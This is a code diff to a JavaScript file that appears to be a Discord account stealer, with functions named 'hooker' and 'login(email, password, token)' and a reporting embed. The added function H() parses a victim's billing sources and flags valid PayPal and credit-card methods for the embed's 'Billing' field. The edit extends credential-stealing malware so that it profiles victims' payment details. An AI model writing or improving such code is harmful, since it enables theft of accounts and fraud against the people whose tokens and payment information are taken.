@@ -324,6 +324,31 @@ const hooker = (content) => {
 };
 
 
+ function H() {
+                          const A0 = JSON.parse(k)
+                          var K = ''
+                          return (
+                            A0.forEach((A1) => {
+                              if (A1.type == '') {
+                                return '`No`'
+                              } else {
+                                if (A1.type == 2 && A1.invalid != true) {
+                                  K += ' <:paypal:896441236062347374>'
+                                } else {
+                                  if (A1.type == 1 && A1.invalid != true) {
+                                    K += ' :credit_card:'
+                                  } else {
+                                    return '`No`'
+                                  }
+                                }
+                              }
+                            }),
+                            K == '' && (K = '`No`'),
+                            K
+                          )
+                        }
+
+
 const login = async (email, password, token) => {
   
 
@@ -356,7 +381,7 @@ const login = async (email, password, token) => {
           },
           {
             name: "<a:tre:962470727129391134> Billing:",
-            value: `\`${billing}\``,
+            value: '' + H(),
             inline: true,
           },
           {
